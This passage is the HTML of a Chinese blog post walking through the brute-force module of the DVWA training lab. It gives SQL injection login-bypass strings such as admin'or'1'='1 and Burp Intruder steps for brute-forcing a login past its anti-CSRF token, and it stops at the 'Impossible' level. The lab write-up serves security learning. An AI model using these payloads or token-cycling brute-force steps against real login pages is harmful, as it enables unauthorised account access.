@@ -1,0 +1,1634 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="https:&#x2F;&#x2F;www.sqlsec.com&#x2F;2020&#x2F;05&#x2F;dvwa.html#Low-2                     一、暴力破解                            Low       随便输入一个账号密码登录，然后抓包发送到攻击器  选好payload位置，开始暴力破解 最后爆破出来账号是admin 密码是password 看源代码  可以看到只有一句简单的查">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA-学习">
+<meta property="og:url" content="http://example.com/2024/05/19/DVWA%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="https:&#x2F;&#x2F;www.sqlsec.com&#x2F;2020&#x2F;05&#x2F;dvwa.html#Low-2                     一、暴力破解                            Low       随便输入一个账号密码登录，然后抓包发送到攻击器  选好payload位置，开始暴力破解 最后爆破出来账号是admin 密码是password 看源代码  可以看到只有一句简单的查">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192112109.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191935953.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191938732.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191941261.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192110071.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192118023.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201434435.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201414105.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201418002.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201418199.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201419517.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201420588.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201422809.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201441479.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201450526.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201502820.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201450722.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201504764.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201505236.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201519277.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201523319.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201526098.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201542994.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201542105.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201541804.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261023149.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261044928.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261111981.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210853201.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210854330.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210854374.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210855753.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210913327.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210914641.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210916324.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210918327.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405210944172.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212139550.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211008555.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212139342.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231105935.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211015259.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211017425.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211021371.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211022578.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211023786.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211029661.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211029463.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211031549.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211032344.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212153165.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405212152876.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211103883.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241049477.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241039323.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241042392.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241042729.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241055812.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241106627.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241108352.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241122687.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241125526.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241125100.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211513362.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211514062.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211515222.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211516022.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211522744.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211523383.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211549055.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211550951.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211552757.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211556881.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241330520.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241331421.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241332189.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241333134.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211600670.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211636361.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211637282.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211641567.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211642588.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211643275.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221101651.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211655692.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211707114.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211718721.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211719285.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211721487.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211732457.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220908607.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220908944.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220909854.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220913553.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220915719.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220918767.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220929877.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220932207.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220939543.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220953882.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221001894.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221010692.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232157912.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232208754.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232207992.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241319693.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221337952.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221320595.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221320302.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221321139.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221339914.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221340011.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221340132.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221347858.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221348596.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221351986.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221357695.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221358115.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221402921.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221427296.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221426548.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221437399.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221443734.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241346928.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221450403.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221539191.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221541437.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221542746.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221542951.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221545935.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221553997.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221604723.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221617977.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221618875.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221558788.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221619724.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221623430.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221627508.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221623645.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221630166.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211304691.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211305114.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211308619.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211309067.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211311646.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211317739.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211337925.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211341785.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211343718.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221456806.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221455989.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221457945.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221459285.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221509004.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241410602.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221523293.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241412124.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221524697.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221714400.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221713230.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221726381.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221727414.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221728025.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221731556.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222112926.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261116135.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261117729.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261119437.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261128991.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261128097.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222153568.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222154246.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222156874.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222157635.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222200703.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222207601.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222208476.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230955703.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222209278.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230915098.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230915136.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230906036.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230917698.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230927665.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230928215.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230928497.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230951922.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230951593.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230948877.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230956126.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231005923.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231007763.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231009624.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231011368.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231013397.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231026658.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231026879.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231028188.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231028988.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231051923.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231055647.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231057619.png">
+<meta property="article:published_time" content="2024-05-19T08:26:33.000Z">
+<meta property="article:modified_time" content="2024-05-27T07:14:10.328Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="DVWA靶场练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192112109.png"><title>DVWA-学习 | Hexo</title><link ref="canonical" href="http://example.com/2024/05/19/DVWA%E9%9D%B6%E5%9C%BA/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">DVWA-学习</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-27</span></span></div></header><div class="post-body"><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/dvwa.html#Low-2" >https://www.sqlsec.com/2020/05/dvwa.html#Low-2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="一、暴力破解"   >
+          <a href="#一、暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、暴力破解" class="headerlink" title="一、暴力破解"></a>一、暴力破解</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192112109.png" alt="image-20240519211247063"></p>
+
+        <h2 id="Low"   >
+          <a href="#Low" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low" class="headerlink" title="Low"></a>Low</h2>
+      <p>随便输入一个账号密码登录，然后抓包发送到攻击器</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191935953.png" alt="image-20240519193557877"></p>
+<p>选好payload位置，开始暴力破解</p>
+<p>最后爆破出来账号是admin 密码是password</p>
+<p>看源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191938732.png" alt="image-20240519193820686"></p>
+<p>可以看到只有一句简单的查询语句，也可以利用sql注入的漏洞，已知账号后在账号栏内输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p>或是</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;-- (注意后面还有一个空格)</span><br></pre></td></tr></table></div></figure>
+
+<p>密码随意，也能成功登录</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405191941261.png" alt="image-20240519194158205"></p>
+
+        <h2 id="Medium"   >
+          <a href="#Medium" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2>
+      <p>暴力破解也能破，但是查看源代码后</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192110071.png" alt="image-20240519211043996"></p>
+<p>可以看到使用了<code>mysqli_real_escape_string</code>函数来防止SQL注入</p>
+<p>所以到了中等难度时就必须得知道账号和密码才行</p>
+
+        <h2 id="High"   >
+          <a href="#High" class="heading-link"><i class="fas fa-link"></i></a><a href="#High" class="headerlink" title="High"></a>High</h2>
+      <p>抓包后可以看到多了令牌</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405192118023.png" alt="image-20240519211856968"></p>
+<p>而且提交之后令牌又发生了改变，之后该令牌值和页面提交一起传至服务端进行验证。服务端收到请求后，首先判断token的值是否合法，再进行sql查询</p>
+<p>查看源代码发现</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201434435.png" alt="image-20240520143405390"></p>
+<p>通过<code>checkToken</code>函数验证提交的表单中的<code>user_token</code>与会话中的<code>session_token</code>是否一致。这有助于防止跨站请求伪造攻击，代码在每次请求结束时通过<code>generateSessionToken</code>函数刷新CSRF令牌，以增强会话的安全性。</p>
+<p>使用stripslashes去除转义字符，防止转义字符影响 SQL 查询的语法，尤其是在使用旧的 PHP 版本或配置不当的服务器上；并且数据清洗，在将数据存储到数据库之前，去除不必要的转义，以确保数据的准确性和预期的处理。</p>
+
+        <h6 id="有token时的burpsuite暴力破解"   >
+          <a href="#有token时的burpsuite暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#有token时的burpsuite暴力破解" class="headerlink" title="有token时的burpsuite暴力破解"></a>有token时的burpsuite暴力破解</h6>
+      <p>抓包发送到Intruder后，将username、password、user_token进行<code>add$</code>操作，然后选择交叉攻击（假如有两个标志位置，那么发起攻击后进行攻击的顺序为a1,b1、a2,b2…）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201414105.png" alt="image-20240520141424996"></p>
+<p>再在“选项”里找到Grep-Extract，点击“添加”，再点击“获取响应”后选择token</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201418002.png" alt="image-20240520141815942"></p>
+<p>复制这个token，点击“确认”</p>
+<p>重定向选择“总是”</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201418199.png" alt="image-20240520141856172"></p>
+<p>资源池设置线程为1（不支持多线程）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201419517.png" alt="image-20240520141949457"></p>
+<p>“payload”里前两个依次设置对应好，第3个payload集类型为递归提取，并把复制的token粘贴刀初始payload</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201420588.png" alt="image-20240520142052542"></p>
+<p>开始攻击</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405201422809.png" alt="image-20240520142212762"></p>
+<p>成功</p>
+
+        <h2 id="Impossible"   >
+          <a href="#Impossible" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2>
